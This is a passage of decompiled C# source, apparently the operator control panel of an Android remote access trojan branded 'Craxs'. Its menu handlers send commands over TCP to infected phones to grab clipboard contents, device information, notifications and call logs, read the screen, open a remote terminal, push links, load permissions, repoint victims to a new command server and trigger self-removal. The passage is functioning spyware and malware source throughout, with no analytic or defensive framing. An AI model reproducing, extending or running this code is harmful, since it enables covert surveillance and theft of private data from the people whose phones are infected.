								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter Link";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
							break;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(dialog.Mytext.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void NotificationListnerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Notifications_" + client.ClientAddressIP;
						Craxspopup Eaglepopup = (Craxspopup)MyProject.Application.OpenForms[name];
						if (Eaglepopup == null)
						{
							Eaglepopup = new Craxspopup();
							Eaglepopup.Location = ClientsWindow.PointToScreen(ClientsWindow.GetCellDisplayRectangle(0, selectedRow.Index, cutOverflow: false).Location);
							Eaglepopup.ClassClient = client;
							Eaglepopup.Show();
							selectedRow.Cells[8].Value = Codes.BlankImage();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void CallsListnerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Calls_Log_" + client.ClientAddressIP;
						CraxsCallLogs craxscallslog2 = (CraxsCallLogs)MyProject.Application.OpenForms[name];
						if (craxscallslog2 == null)
						{
							craxscallslog2 = new CraxsCallLogs();
							craxscallslog2.Location = ClientsWindow.PointToScreen(ClientsWindow.GetCellDisplayRectangle(0, selectedRow.Index, cutOverflow: false).Location);
							craxscallslog2.ClassClient = client;
							selectedRow.Cells[9].Value = Codes.BlankImage();
							craxscallslog2.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void PhoneInformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Information + Data.SPL_SOCKET + "information",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem15_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							CraxsAlert.Showinformation("the tool is under maintenance ");
							break;
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem16_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient5 + Data.SPL_SOCKET + "10000",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
							client.Close(myClient);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem17_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							client.Blockme(client.ClientAddressIP);
							client.Close(client.myClient);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem18_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "kill<*>x" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "SelfRemove_" + client.ClientAddressIP;
						SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
						if (selfRemove == null)
						{
							selfRemove = new SelfRemove();
							selfRemove.Classclient = client;
							selfRemove.Show();
						}
						else
							selfRemove.BringToFront();
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	
	private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					try
					{
						if (client != null)
						{
							string folderUSER = client.FolderUSER;
							if (!Directory.Exists(folderUSER))
								Directory.CreateDirectory(folderUSER);
							Process.Start(folderUSER);
						}
					}
					catch (Exception)
					{
                        //ProjectData.SetProjectError(projectError);
                        //////CraxsAlert.Showinformation("Sorry");
                    }
                }
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError2);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError3);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem12_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Permissions_Manager" + client.ClientRemoteAddress;
						PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
						if (permissionsManager != null)
						{
							permissionsManager.BringToFront();
							break;
						}
						permissionsManager = new PermissionsManager();
						permissionsManager.Name = name;
						permissionsManager.Tag = client.ClientAddressIP;
						permissionsManager.Classclient = client;
						permissionsManager.Show();
						TcpClient myClient = client.myClient;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>[lod]" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
						CraxsAlert.ShowSucess("Loading Permissions Started...");
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".terminal" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCommand + Data.SPL_SOCKET + "run",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					TcpClient myClient = client.myClient;
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
				return;
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.isconnected)
			{
				string name = "Permissions_Manager" + client.ClientRemoteAddress;
				PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
				if (permissionsManager == null)
				{
					permissionsManager = new PermissionsManager();
					permissionsManager.Name = name;
					permissionsManager.Tag = client.ClientAddressIP;
					permissionsManager.Classclient = client;
					permissionsManager.Show();
					TcpClient myClient = client.myClient;
					string[] array = client.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>[lod]" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
					CraxsAlert.ShowSucess("Loading Permissions Started...");
				}
				else
					permissionsManager.BringToFront();
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
				return;
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.isconnected)
			{
				string name = "SelfRemove_" + client.ClientAddressIP;
				SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
				if (selfRemove == null)
				{
					selfRemove = new SelfRemove();
					selfRemove.Classclient = client;
					selfRemove.ShowDialog();
				}
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon6_Click_1(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
				return;
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.isconnected)
			{
				TcpClient myClient = client.myClient;
				Dialog1 dialog = new Dialog1();
				dialog.Title = "Enter Messege";
				dialog.ShowDialog();
				if (dialog.DialogResult == DialogResult.OK)
				{
					string[] array = client.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + dialog.Mytext.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ClientsWindow_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void DrakeUIButtonIcon7_Click_1(object senderx, EventArgs ex)
	{
		ClientsWindow.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				bigtitletext.Text = "Clients";
			else
				bigtitletext.Text = "客户";
		}
		else
			bigtitletext.Text = "عملاء";
		if (RegistryHandler.GET_FTtip() == null)
		{
			RegistryHandler.Set_FTtip("Shown");
			//tipfirewalltracker tipfirewalltracker2 = new tipfirewalltracker();
		//	tipfirewalltracker2.ShowDialog();
		}
	}

	private void DrakeUIButtonIcon10_Click_1(object sender, EventArgs e)
	{
		DGVblocked.BringToFront();
        checkclearlogs.BringToFront();
        DGVblocked.Visible = true;
        checkclearlogs.Visible = true;
        string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				bigtitletext.Text = "Blocked List";
			else
				bigtitletext.Text = "禁止名单";
		}
		else
			bigtitletext.Text = "قائمة الحظر";
	}

	private void Connection_btn_Click(object sender, EventArgs e)
	{
		try
		{
			DataLog.BringToFront();
            checkclearlogs.BringToFront();
            DataLog.Visible = true;
            checkclearlogs.Visible = true;
			clearbtn.Visible = true;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
					bigtitletext.Text = "Connections";
				else
					bigtitletext.Text = "电信";
			}
			else
				bigtitletext.Text = "الاتصالات";
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIAvatar1_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0)
			try
			{
				List<Client> list = new List<Client>();
				foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
				{
					try
					{
						if (selectedRow.Tag != null)
						{
							Client client = (Client)selectedRow.Cells[8].Tag;
							if (client != null)
								list.Add(client);
						}
					}
					catch (Exception)
					{
                        //ProjectData.SetProjectError(projectError);
                        //////CraxsAlert.Showinformation("Sorry");
                    }
                }
				if (list.Count > 0)
				{
					EditConnections editConnections = new EditConnections(list);
					if (editConnections.ShowDialog() == DialogResult.OK && editConnections.SelectedList.Count > 0)
					{
						foreach (Client selected in editConnections.SelectedList)
						{
							TcpClient myClient = selected.myClient;
							string newHost = editConnections.NewHost;
							string newPort = editConnections.NewPort;
							string newName = editConnections.NewName;
							string[] array = selected.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "EHP<*>" + newHost + "#" + newPort + "#" + newName + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + selected.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								selected
							};
							selected.SendMessage(parametersObjects);
						}
						CraxsAlert.ShowSucess("Connection Edit Successfully");
					}
					editConnections.Dispose();
				}
				return;
			}
			catch (Exception)
			{
                //ProjectData.SetProjectError(projectError2);
                //////CraxsAlert.Showinformation("Sorry");
                return;
			}
		CraxsAlert.Showinformation("No Clients Found");
	}

	public string isinteger(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		string text = "";
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
        return "";
	}

	private void ToolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "SC_Readv2_" + client.ClientAddressIP;
						ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
						if (screenReaderV == null)
						{
							screenReaderV = new ScreenReaderV2();
							screenReaderV.Name = name;
							screenReaderV.Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP);
							screenReaderV.Tag = client.ClientRemoteAddress;
							screenReaderV.classClient = client;
							screenReaderV.Client = client.myClient;
							screenReaderV.DownloadsFolder = client.FolderUSER;
							screenReaderV.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Checkupdate_Tick(object sender, EventArgs e)
	{
		try
		{
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			checkupdate.Stop();
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Mapworker_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	private void Mapworker_DoWork_1(object sender, DoWorkEventArgs e)
	{
		checked
		{
			_Closure_0024__171_002D0 closure_0024__171_002D = default(_Closure_0024__171_002D0);
			while (Alive)
			{
				Thread.Sleep(10000);
				try
				{
					if (ClientsWindow.Rows.Count <= 0)
						continue;
					try
					{
						closure_0024__171_002D = new _Closure_0024__171_002D0(closure_0024__171_002D);
						closure_0024__171_002D._0024VB_0024Local_keyValues = new Dictionary<string, double>();
						int num = ClientsWindow.Rows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							string key = Data.GeoIP0.LookupCountryCode(((Client)ClientsWindow.Rows[i].Cells[8].Tag).ClientAddressIP.ToString().Trim()).ToUpper();
							closure_0024__171_002D._0024VB_0024Local_keyValues[key] = ran.Next(100, 1000);
						}
						Invoke(new VB_0024AnonymousDelegate_0(closure_0024__171_002D._Lambda_0024__0));
					}
					catch (Exception)
					{
                        //ProjectData.SetProjectError(projectError);
                        //////CraxsAlert.Showinformation("Sorry");
                    }
                }
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError2);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
	}

	private void Statustimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			try
			{


                float cpuUsage = cpuCounter.NextValue();

				drakeUIMeter1.Value = cpuUsage;
                if (Operators.CompareString(temptext, recvtotal.Text, TextCompare: false) == 0)
					recvtotal.Text = "Received 0 Bytes";
				else
					temptext = recvtotal.Text;
				if (Operators.CompareString(temptext2, senttotal.Text, TextCompare: false) == 0)
					senttotal.Text = "Sent 0 Bytes";
				else
					temptext2 = senttotal.Text;
				int num = server.Count - 1;
				long num2 = default(long);
				long num3 = default(long);
				for (int i = 0; i <= num; i++)
				{
					try
					{
						num2 += server[i].BytesSent;
						num3 += server[i].BytesReceived;
					}
					catch (Exception)
					{
                        //ProjectData.SetProjectError(projectError);
                        //////CraxsAlert.Showinformation("Sorry");
                    }
                }
				Array array = Codes.UploadDownload(num2, num3);
                recvtotal.Text = Conversions.ToString(Operators.ConcatenateObject("Received : ", array.GetValue(0)));
				label6.Text = Conversions.ToString(ClientsWindow.Rows.Count);
				label1.Text = Conversions.ToString(Operators.ConcatenateObject("",array.GetValue(0)));
				label2.Text = Conversions.ToString(Operators.ConcatenateObject("", array.GetValue(1)));
                senttotal.Text = Conversions.ToString(Operators.ConcatenateObject("Sent : ", array.GetValue(1)));
				drakeUILabel3.Text = "Selected : "+ Conversions.ToString(ClientsWindow.SelectedRows.Count);
				drakeUILabel4.Text = "Key : " + Data.password;
                drakeUILabel1.Text = "Port : " + infoServer.PORTS;
                infotext.Text = "Online : " + Conversions.ToString(ClientsWindow.Rows.Count) + "\r\nPort : " + infoServer.PORTS + "\r\nKey :" + Data.password;
				infolowtext.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Ready: " + Conversions.ToString(ClientsWindow.Rows.Count) + Strings.Space(5) + "Selected :" + ClientsWindow.SelectedRows.Count + Strings.Space(5) + "Received : ", Operators.AddObject(Operators.AddObject(array.GetValue(0), Strings.Space(5)), "Sent : ")), array.GetValue(1)));
				if (Operators.CompareString(label16.Text, Codes.AesDecrypt("g149MONTtQjEFzAAIpgk2w==", "0319749625846139"), TextCompare: false) != 0 && ClientsWindow.Rows.Count > 0)
					ClientsWindow.Rows.Clear();
			}
			catch (Exception)
			{
                //ProjectData.SetProjectError(projectError2);
                //////CraxsAlert.Showinformation("Sorry");
            }
            if (Data.LastClient != null && Data.LastClient.isconnected)
				try
				{
					lastclientpic.Image = Data.LastClient.Wallpaper;
					lastclienttext.Text = Data.LastClient.ClientName + "\r\n" + Data.LastClient.Country + "\r\n" + Data.LastClient.ClientAddressIP;
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError3);
                    //////CraxsAlert.Showinformation("Sorry");
                }
        }
	}

	private void Addpo_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(toblocktext.Text))
		{
			CraxsAlert.Showinformation("Enter ip address to block");
			return;
		}
		checked
		{
			try
			{
				int num = server.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (!server[i].Blocklist.Contains(toblocktext.Text))
					{
						server[i].Blocklist.Add(toblocktext.Text);
						Data.MainForm.DGVblocked.Rows.Add(GetFlagThisIp.ThisIp(toblocktext.Text), toblocktext.Text);
					}
				}
				CraxsAlert.ShowSucess("Client Blocked Successfully");
			}
			catch (Exception)
			{
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
	}

	private void ClientsWindow_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
	{
		DataGridViewRow dataGridViewRow = null;
		try
		{
			dataGridViewRow = ClientsWindow.Rows[e.RowIndex];
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
            return;
		}
		try
		{
			Client client = (Client)dataGridViewRow.Cells[8].Tag;
			if (e.ColumnIndex == 8)
			{
				if (dataGridViewRow == null)
					return;
				if (client != null && client.isnewnotifi)
				{
					string name = "Notifications_" + client.ClientAddressIP;
					Craxspopup Eaglepopup = (Craxspopup)MyProject.Application.OpenForms[name];
					if (Eaglepopup == null)
					{
						Eaglepopup = new Craxspopup();
						Eaglepopup.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
						Eaglepopup.ClassClient = client;
						Eaglepopup.Show();
						dataGridViewRow.Cells[8].Value = Codes.BlankImage();
						client.isnewnotifi = false;
					}
				}
				else
					dataGridViewRow.Cells[8].Value = Codes.BlankImage();
			}
			else if (e.ColumnIndex == 9)
			{
				if (client != null && client.isnewcall)
				{
					string name2 = "Calls_Log_" + client.ClientAddressIP;
					CraxsCallLogs craxscallslog2 = (CraxsCallLogs)MyProject.Application.OpenForms[name2];
					if (craxscallslog2 == null)
					{
						craxscallslog2 = new CraxsCallLogs();
						craxscallslog2.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
						craxscallslog2.ClassClient = client;
						dataGridViewRow.Cells[9].Value = Codes.BlankImage();
						client.isnewcall = false;
						craxscallslog2.Show();
					}
				}
				else
					dataGridViewRow.Cells[9].Value = Codes.BlankImage();
			}
			else
			{
				if (e.ColumnIndex != 10)
					return;
				try
				{
					if (client != null)
					{
						string toolTipText = "%" + client.BatteryCharge.Replace("f", "").Replace("t", "");
						dataGridViewRow.Cells[10].ToolTipText = toolTipText;
						Rectangle cellDisplayRectangle = ClientsWindow.GetCellDisplayRectangle(e.ColumnIndex, e.RowIndex, cutOverflow: false);
						ToolTips.Show(toolTipText, ClientsWindow, cellDisplayRectangle.Right, checked(cellDisplayRectangle.Top + cellDisplayRectangle.Height));
					}
					return;
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError2);
                    //////CraxsAlert.Showinformation("Sorry");
                    return;
				}
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError3);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

